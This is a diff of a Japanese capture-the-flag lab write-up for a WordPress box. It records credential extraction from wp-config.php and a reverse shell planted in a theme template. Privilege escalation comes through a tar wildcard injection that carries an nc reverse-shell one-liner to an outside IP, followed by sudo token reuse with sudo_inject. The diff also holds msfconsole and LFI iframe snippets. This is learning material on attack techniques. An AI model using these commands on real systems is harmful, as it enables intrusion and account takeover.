@@ -346,106 +346,169 @@ ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
 
 というフローを想像するが、wp-config.php のPathが不明。
 
+`/var/www/wordpress/wp-config.php` が正解。Wordpress のデフォルト設定がこれらしい。
 
+```php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+/** Database username */
+define( 'DB_USER', 'wordpressuser' );
+/** Database password */
+define( 'DB_PASSWORD', '[REDACTED]' );
+```
 
+usersテーブルのパスワードハッシュを取得、hashcat でクラック成功した。  
+パスワードによるSSH接続は禁止されていた。  
+/wp-admin でログイン成功。
 
-
-
-
-## 権限昇格
+テーマエディタから404テンプレートを変更してリバースシェル取得。
 
 ```sh
-# env_keep+=LD_PRELOAD は見落としがちなので注意
-sudo -l
+www-data@ip-10-146-189-158:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## 権限昇格１
+
+su で kyle にはなれなかった。
+
+```sh
+www-data@ip-10-146-189-158:/$ su kyle
+Password: 
+su: Authentication failure
+```
+
+kyle オーナーのファイルを検索
+
+```sh
+www-data@ip-10-146-189-158:/$ find / -user kyle -type f -not -path "/proc/*" 2>/dev/null
+/var/www/internal/sunset.jpg
+/var/www/internal/maintenance/backup.sh
+/var/www/internal/.htaccess
+/var/www/internal/invoice.php
+/var/www/internal/cartoonsurfer.png
+```
+
+毎分実行されているというbackupスクリプト。tarをワイルドカードで実行しているパターン。
+
+```sh
+www-data@ip-10-146-189-158:/$ cat /var/www/internal/maintenance/backup.sh
+#!/bin/bash
+
+# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
+# Still need to come up with a better backup system, perhaps a cloud provider?
+
+cd /var/www/internal/invoices
+tar -zcf /home/kyle/backups/invoices.tgz *
+```
+
+このディレクトリは、www-data でフルアクセス可能。
+
+```sh
+www-data@ip-10-146-189-158:/$ ls -al /var/www/internal/invoices
+total 880
+drwxrwxrwx 2 www-data www-data   4096 Apr  6 01:48 .
+```
+
+エクスプロイト
+
+```sh
+www-data@ip-10-146-189-158:/var/www/internal/invoices$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.128.106 8888 >/tmp/f" > shell.sh
+www-data@ip-10-146-189-158:/var/www/internal/invoices$ touch "/var/www/internal/invoices/--checkpoint-action=exec=sh shell.sh"
+www-data@ip-10-146-189-158:/var/www/internal/invoices$ touch "/var/www/internal/invoices/--checkpoint=1"
+```
+
+kyle のシェル取得成功
+
+```sh
+$ nc -nlvp 8888
+listening on [any] 8888 ...
+connect to [192.168.128.106] from (UNKNOWN) [10.146.189.158] 47170
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev)
+```
+
+## 権限昇格２
+
+`sudo -l` はパスワードが必要。SSH接続しても同じだった。
+
+ps を実行したら下記のエラーが出た。
+
+```sh
+kyle@ip-10-146-189-158:~$ ps aux
+Error, do this: mount -t proc proc /proc
+```
+
+気になるログがあったが。rockyouではクラックできなかった。
+
+```sh
+/var/log/installer/autoinstall-user-data:    password: $6$hq600HkLbsAiSVHZ$/6GmaV6.y4iVS.OM9AI.O5OVQxq1y/C1A6AX4t9uFLyNzaIr/50cRFqLZCYsAwfQvrgQKdZPnOnyEbgzw7RhV/
+```
+
+sudo を実行したログが出ている。
+
+```sh
+/var/log/auth.log.1:May 10 16:03:58 seasurfer sudo:     kyle : TTY=pts/1 ; PWD=/home/kyle ; USER=root ; COMMAND=/root/admincheck
+```
+
+実行してみると、やはりパスワードを要求される。
+
+```sh
+kyle@ip-10-146-189-158:~$ sudo /root/admincheck
+[sudo] password for kyle: 
+```
+
+行き詰ったのでウォークスルーを見た。
+
+ウォークスルーによると、ptrace保護が無効になっているらしいが・・・
+
+```sh
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
+ptrace protection is disabled (0)
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+```
+
+実際の実行結果では、有効になっている・・・
+
+```sh
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                                                                      
+ptrace protection is enabled ()                                                                                                                                                                                                            
+
+doas.conf Not Found
+```
+
+公式ウォークスルーでは、gdbをインストールして sudo_inject を使って sudoトークンを再利用することになっている。
+
+https://github.com/nongiach/sudo_inject/blob/master/exploit_v2.sh
+
+```sh
+kyle@seasurfer:/tmp/gdb$ ls
+gdb_9.1-0ubuntu1_amd64.deb
+kyle@seasurfer:/tmp/gdb$ ar x gdb_9.1-0ubuntu1_amd64.deb 
+kyle@seasurfer:/tmp/gdb$ tar -xf data.tar.xz
+kyle@seasurfer:/tmp/gdb$ cd usr/bin/
+kyle@seasurfer:/tmp/gdb/usr/bin$ ./gdb
+GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+...
+(gdb) Quit
+kyle@seasurfer:/tmp/gdb/usr/bin$ export PATH=$(pwd):$PATH
 ```
 
 ```sh
-find / -perm -u=s -type f -ls 2>/dev/null
+kyle@seasurfer:~$ sh exploit_v2.sh 
 ```
-
-```sh
-find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
-find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
-```
-
-```sh
-getcap -r / 2>/dev/null
-ls -al /var/backups
-cat /etc/crontab
-cat /etc/exports
-```
-
-どうしても何も見つからない場合の最後の手段として、linpeasのCVEリストに有効なものがないか確認する。
 
 ## 振り返り
 
--
--
+- PDF生成を悪用したLFIは初見。
+- sudoインジェクションは勉強になった。
 
 ## Tags
 
-#tags: #tags: #tags:
-
-```sh
-# 大分類（Linuxはタグ付けしない）
-Window Kerberos AWS pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM
-
-# 脆弱性の種類
-CVE-xxxx-yyyyy カーネルエクスプロイト
-ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報 証明書テンプレート
-
-# 攻撃の種類
-サービス LFI SSRF XSS SQLインジェクション 競合 認証バイパス フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles
-
-# ツールなど
-docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle スマートコントラクト
-```
-
-## メモ
-
-### シェル安定化
-
-```shell
-# python が無くても、python3 でいける場合もある
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# sh: 3: export: -c: bad variable name というエラーが出る場合、まず /bin/bash を実行する。
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-```
-
-### SSH
-
-ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする
-
-```sh
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
-```
-
-エラー
-
-```sh
-# no matching host key type found. Their offer: ssh-rsa,ssh-dss
-# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
--oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
-```
-
-```sh
-TARGET=10.144.130.129
-sudo bash -c "echo $TARGET   seasurfer.thm  internal.seasurfer.thm >> /etc/hosts"
-
-<iframe height="2000" width="800" src="http://192.168.128.106:8888/passwd"></iframe>
-
-```
+#tags:wkhtmltopdf #tags:LFI #tags:sudo_inject
